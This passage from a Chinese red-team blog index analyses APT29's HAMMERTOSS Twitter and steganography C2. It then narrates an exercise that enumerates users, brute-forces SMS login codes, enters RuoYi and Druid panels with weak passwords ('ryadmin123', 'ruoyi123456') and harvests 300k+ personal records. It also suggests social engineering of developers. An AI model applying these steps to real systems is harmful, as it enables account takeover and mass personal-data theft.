以及肉鸡作为通信链每天自动访问不同的 Twitter 句柄。使用定时开始——在特定日期之后或仅在受害者的工作周内进行通信。通过包含隐藏和加密数据的图像获取命令。从肉鸡和云存储中上传的文件提取信息 阶段1：Twitter句柄生成算法算法逻辑：基名（如”Bob”） + CRC32(日期) → 1abBob52bURL生成：https://twitter.com/1abBob52b特点：每日自动生成不同句柄，大量虚假账户混淆 阶段2：推文中的加密参数传递推文格式：Follow doctorhandbook.com #101docto解析结果： URL：doctorhandbook.com（第二阶段C2地址） 偏移量：101字节 密钥片段：docto GitHub合法服务承载利用GitHub页面托管恶意图片通过IE COM对象访问，模拟正常浏览行为多样化承载平台（GitHub、被攻陷网站、云存储） 关键特征分析 分层混淆策略Layer 1: 算法生成的大量虚假Twitter账户Layer 2: 合法社交媒体代码托管平台中转Layer 3: 图像隐写术隐藏真实载荷Layer 4: 多重加密密钥分离存储 Layer 5: 云服务匿名化数据收集 适应性防御机制平台切换：Twitter被封锁→切换到直连变种账户轮换：发现算法后可快速删除历史痕迹载荷多样化：图片大小格式随机变化时间规避：工作日激活，假期休眠 火眼：APT29 几乎总是使用反取证技术，他们监控受害者的补救工作以颠覆它们。同样，该组织似乎几乎只使用 CnC 的受感染服务器来增强其运营的安全性，并通过快速修改工具来破坏检测来维持其恶意软件的快速开发周期。这些方面使 APT29 成为我们跟踪的最有能力的 APT 组织之一。 1.3 HAMMERTOSS—C2基建的变体 详细阐述APT29 可能使用 HAMMERTOSS 作为其两个主要后门的备份，以执行命令\t它们为 APT29 提供了与恶意软件通信的替代方式。开发人员似乎将这些变体命名为 uploader 和 tDiscoverer。这两个变体都是用 C# 编程语言编写的 每个变体都使用不同的方法来获取 C2 指令，要么直接访问硬编码网站，要么作为中介访问 Twitter。 uploader已预配置为使用硬编码服务器作为其 C2中介。它转到特定 URL 以获取具有特定文件大小的图像。tDiscoverer 使用额外的混淆层，首先访问 Twitter 获取 CnC URL，然后再访问该 URL 获取其目标图像。 我们将恶意软件通信过程分为五个阶段，以解释该工具如何运行、接收指令以及从受害者网络中提取信息。这些阶段包括有关 APT29 在受感染网络之外与 HAMMERTOSS 通信的信息，以及对该工具掩盖其活动的能力的简要评估。 HAMMERTOSS 后门每天生成并查找不同的 Twitter 句柄。它使用一种算法来生成每日句柄，例如“234Bob234”，然后再尝试访问相应的 Twitter 页面。如果威胁组织没有注册当天的句柄，HAMMERTOSS 将等到第二天再寻找不同的句柄。 HAMMERTOSS 访问关联的 Twitter 帐户并查找带有 URL 和主题标签的推文，该标签指示图像文件的位置和最小大小。 HAMMERTOSS 访问 URL 并获取图像。 图像看起来很正常，但实际上包含使用隐写术的隐藏和加密数据。HAMMERTOSS 解密隐藏数据以获取命令。 HAMMERTOSS 处理解密的命令，这些命令可能会指示恶意软件进行侦察、通过 PowerShell 执行命令或将数据上传到云存储服务。 第一阶段详解 HAMMERTOSS 包含一种算法，可以生成 Twitter 句柄，告诉恶意软件在特定日期访问特定的 Twitter 句柄。 Twitter 句柄是与 Twitter 网站关联的用户 ID。例如，FireEye 的 Twitter 句柄 @FireEye 有一个 URL：https://www.twitter.com/ fireeye。HAMMERTOSS 算法使用一个基本名称，如“Bob”，并在前面附加和预加三个 CRC32 基于当前日期的值。例如，可以是 1abBob52b，其 URL 为：hxxps:www.twitter.com/1abBob52b。 HAMMERTOSS 访问与其每日 Twitter 账号相关的 Twitter URL。例如，在 7 月 29 日，它可能会查找句柄 1abBob52b （hxxps:twitter.com1abBob52b）APT29 的运营者选择在预期通信之前使用相同的算法注册特定日期的 Twitter 句柄。 3.APT29 知道用于生成句柄的算法，并选择注册 Twitter 句柄，并在恶意软件尝试查询之前将混淆的指令发布到句柄的 URL。如果未注册特定日期的句柄，并且找不到该日期的 URL，则 HAMMERTOSS 将等到第二天尝试与另一个句柄通信。 4.APT29 通常将 HAMMERTOSS 配置为在某些限制内进行通信，例如仅在工作日或指定的开始日期之后检查 Twitter 句柄。这使得恶意软件能够在受害者的工作周期间融入“正常”流量，或者在激活之前保持休眠一段时间。 第二阶段详解发布 URL、图像的最小文件大小和部分加密密钥 如图 是 HAMMERTOSS tDiscoverer 变体的示例，以及来自其生成的句柄之一的 Twitter 帐户页面的相应快照。在发布时，一个公开的 HAMMERTOSS 样本在 VirusTotal 中只有五个通用检测。该 Twitter 帐户处于活动状态，并包含指向网站的链接. 第三阶段详解访问 GitHub 下载映像 APT29 的运营商注册了一个 GitHub 页面并上传了一张图片。 接下来的打法就很细节了 .fdnfdnqyjwqe{zoom:33%;} 前面通过推文中指定的URL，继续访问并下载对应的隐写图像，那么这个时候通过HAMMERTOSS内部的解密函数加载命令，就能达成C2执行命令的效果 第四阶段详解基本隐写术的实现 它的隐写术并非你所想象的单单通过加载下载过来的图像并解密那么简单 实际上HAMMERTOSS 将网站内容下载到 IE 的浏览器缓存中，并在缓存中搜索至少与第 2 阶段推文中指定的偏移量一样大的任何图像。 HAMMERTOSS 在第 2 阶段的推文中指定的偏移量处定位加密数据。它使用一个密钥来解密数据，该密钥由恶意软件二进制文件中的硬编码数据组成，并附加了推文中的字符。 也就是说 想要解密 本质上需要推文+图片本身同时存在的隐写算法，既保证了传输安全与隐蔽性的同时 作为攻击者的你可以随时删文销户优雅撤退，这里不得不感叹毛子在红队基建方面的优雅和实用主义 第 5 阶段详解APT29 的运营商创建云存储帐户，可以从云存储服务中获取受害者的数据。 其实本质就是常规的走云上，毕竟大数据量文件的窃取很讲究网络传输的稳定性 结案","tags":["APT","身份隐藏"],"categories":["research"]},{"title":"一次组合拳","path":"/posts/c15578a0/","content":"大道至简，druid弱口令+接口测试组合拳轻松拿下30w+敏感信息在某攻防演练中，我们通过大量的资产测绘以及关键薄弱点攻击，实现了对某省级大型目标从一系列弱密码以及简单的账户劫持作为入口点，打出30w+敏感数据泄露的思路。 希望能够分享给大家，作为一个参考 ‍ 资产测绘部分一般情况下，对一个大型目标的攻防，资产测绘部分是最为重要的。 假设前期只给一个公司名，我会简单的把这个目标分为四个空间作为探测的出发点 金融空间 在金融空间层面，我们更多是站在企业的内里角度去做信息收集，比如通过天眼查，爱企查查询控股子公司。通过招标文件以及官网信息查询第三方供应商。通过ICP备案，查询该企业注册的一系列域名以及小程序，app资产。当然，在网络侧通过GoogleDorking等方法也是能收集到一些涉重点的敏感信息的。 网络空间 网络空间就是常规的信息收集链条，我一般会使用灯塔或者TscanPlus作为收集资产的平台，将金融空间的前期主要域名资产导入，并进入深化的测绘。这里也推荐我自研的一个轮子，可以简单的对前期的域名资产做一个简单收集便于区分优先级。总而言之，这个阶段的需求就是高效的子域名扫描、DNS 查询、端口扫描、活跃性检测、指纹识别、漏洞扫描。 大范围的覆盖性扫描有助于快速定位某些文件泄露，敏感服务。 业务空间 这个时候大部分就是根据目标类型区分，这里就以目标为例。 前期入口点： 该系统为靶标系统的旅游业业务，类似小程序的web端，主要出售一些特定主题的NFT数字产品，是一个架构简单的商城 那么有商城的地方，就需要存储订单，是否有专门的数据库管理服务器？同时既然是某特定主题NFT产品，那么是否有别的系统作为同类型业务，出售其他NFT产品？ 后续根据信息收集，找到旁站业务，其中一个是druid实时分析型数据库, 另外两个商城一个是出售ai绘画产品的存证业务，另外一个则是同主题的品牌文创数字艺术，不过交由其他企业托管。 ​ 人员空间 人员空间这个概念就宽泛的多，更多讲究对这个人本身侧写的立体化，多维化。一个人身处不同的网络空间中，往往有不同的安全意识，那么就意味着可以从这个人员的数字足迹，社会身份入手，发起一次意想不到的跨域攻击 可以从多重身份入手。比如对方兼具某高校讲师以及企业管理人员的双重身份， 身处两个业务逻辑完全不同的组织结构中，你就可以从高校的网络空间入手作为出发点，攻击企业层面的网络空间。比方说以学生身份投递简历，利用高校邮箱发送邮件等，这些以第二现场攻击第一目标的手段屡试不爽。 也可以从某些习惯入手，比如通过Web系统中的某些“关键性注释”，假设我们在前端的css美化中注释提到Last Modified by Satoru, 这个时候对开发人员的攻击就从社工各个开发社区账户乃至到其他社交平台账户，不论是获取源代码还是直接进行“鱼叉式”攻击都很有帮助。 ‍ 因此，资产测绘是非常重要的， 四维联动：金融→网络→业务-人员递进穿透 以小博大：通过关联资产发现核心系统 持续演进：工具链与攻击面同步升级 ‍ 测试部分入口点，简单的任意账户劫持根据前面这个商城系统，开始进行基础的注册，登录操作，这里我拿出尾号9722的电话号码在这个系统做好了前期的注册操作以及基础的信息绑定。 注册过后，我登出，在前台打开devtools并观察网络，做一些简单的操作，观察用户操作时这个商城调用的接口，后续有一些接口引起了我的注意。 ‍ 在登录页面填入电话号码时，这个系统调用了外站的这个接口 https://nft.xxxx.xin/xxx/getUserByPhone?phone= 此时我填入的手机号码作为phone参数被传入该接口，并返回了我在该商城的一些用户信息 那么我将参数随便修改为110 则data为空，那么就可以根据 fuzz phone参数测试用户是否存在 后续尝试使用验证码登录，在获取验证码过程中需要过图形验证码人机验证，本来以为这样的校验逻辑很严谨，但后续发现该系统发送的验证码为4位，且存活时长为15分钟，遂思考能否fuzz验证码成功登录，达到任意用户劫持的效果。 后续则尝试登录功能点，发现登录逻辑同样是经过外站 https://nft.xxxx.xin/xxx/login接口POST--data==========================loginPswd:,phone:xxxx9722,userHash:,userId:xxxx3649793,verifyCode:3410,wxCode:,cid:,recommendCodeId: 尝试验证码3410 尝试验证码3427 可以看到返回了包括用户实名，身份证，住址等一系列敏感信息，同时实现了成功登录。 同时，由于该商城涉及交易等内容，能够通过恶意转送或者拍卖对受害者造成经济损失 而这也引发了我的思考，既然这是个商城，那么这些用户信息和生成验证码逻辑为什么都得调用外站？大量的订单和数据又存储在哪里？ 因此我推测这个架构为多个商城围绕一个数据库服务器，登录逻辑经由外站统一发放 ​ 那么，根据我推测的业务逻辑。就可以开始后续针对性的收集类似业务以及数据库服务器。 一生二，二生三的通杀论通过ICP备案以及前期入口点系统中通过熊猫头，JSFinder以及子域名收集到的其他外站，收集到三个同类型商城 ​ 推测是否共同调用同一个验证码逻辑，并且能够实现任意账户劫持。 后续经过测试，果然三个商城的登录逻辑都依赖于这个外站，那么我只需要拿一个验证码测试其中一个系统的任意用户，就可以拿下其他系统的同用户账户。 同时由于不同商城的逻辑不同，有些商城需要绑定银行卡，因此我也在某些商城的内置接口中获取了银行卡的开户信息，这也代表着我可以利用身份证，住址，银行卡等信息进行一系列人员维度上的打击。 一生二，二生三不但是漏洞层面上的，更是依赖类似的思维通杀网络空间到人员空间，一步步推进攻击链的过程。 根据业务逻辑，追根究底起承–若依弱口令一开始收集到了若依管理后台，于是开始经典的一系列应用。 https://bcadmin.xxxx.cn/#/login?redirect=%2Findex 这里通过经典的ryadmin123进入后台，但由于是普通权限且赋予的功能模块较少，因此这里的进一步利用按下不表，不过若依后台一般搭配druid，这给了我启发:说不定能依靠druid打出庞大的数据量，在登录该后台后拼接了一系列可能的druid路径，可惜都没有找到登录页面，心灰意冷继续收集。 druid弱口令老天终究眷顾笨小孩，后续在该商城某子域的8081端口找到了druid系统 http://bc.xxxx.cn:8081/druid/login.html ​ druid的常规渗透思路： 可以参考上心师傅的思路分享(二)–Druid monitor-CSDN博客 Druid是一个非常好用的数据库连接池，但是他的好并不止体现在作为一个连接池加快数据访问性能上和连接管理上，他带有一个强大的监控工具：Druid Monitor。不仅可以监控数据源和慢查询，还可以监控Web应用、URI监控、Session监控、Spring监控。 这里我通过弱口令ruoyi123456进入了系统 进一步利用 我这里以参考文章的图片为例，我通过URL监控实时查看前面客户端访问的url路径，去查看有没有一些敏感信息的接口,比如说获取用户信息的一些接口 ‍ 这里好巧不巧，正让我找到了三个路由 数据量证明：urlhttp://xx.xxxx.cn:8081/xxx/xxxx/475至http://xx.xxxx:8081/xxx/xxxx/368397共30w+，含手机号姓名住址,部分包含身份证。 ‍ 总结攻击链条其实很简单，这次渗透的核心思路是：从业务逻辑漏洞切入，通过资产测绘扩大攻击面，最终利用管理后台和数据监控系统的弱点实现大规模数据泄露。 入口点突破 发现验证码可爆破（4位+15分钟存活），通过枚举劫持任意用户账户。 外站统一鉴权接口暴露敏感信息（手机号、身份证、住址）。 资产关联扩展 利用ICP备案和子域名爆破，发现三个同类型商城共用同一套鉴权逻辑，实现“通杀”。 通过若依后台弱口令（ryadmin123）进入，推测Druid路径，最终找到Druid监控系统（ruoyi123456）。 数据泄露终局 在Druid的URL监控中捕获30w+敏感数据（含PII），完成从单点漏洞到全局数据泄露的升级。 打法精髓：业务逻辑→资产测绘→数据收割，环环相扣，最终形成降维打击。 ‍","tags":["Pentest"],"categories":["penetration"]},{"title":"关于","path":"/about/index.html","content":"About Me Hi，I'm Satoru. RedTeamer 网络安全小白 懒且宅 专注于红队与APT研究 过于完美主义 依旧从入门到弃坑 倔强的学习 被身边的大佬带动 励志成为糕手，期待和各位师傅共同进步"},{"title":"友链","path":"/friends/index.html","content":"大佬们 如何交换友链 新建 GitHub Issue 按照模板格式填写并提交 更新友链信息 如果您需要更新自己的友链信息，请直接修改 GitHub Issue 内容 , 修改完成后将会在三分钟内自动完成更新。如果无法修改，可以在此页面留言。"}]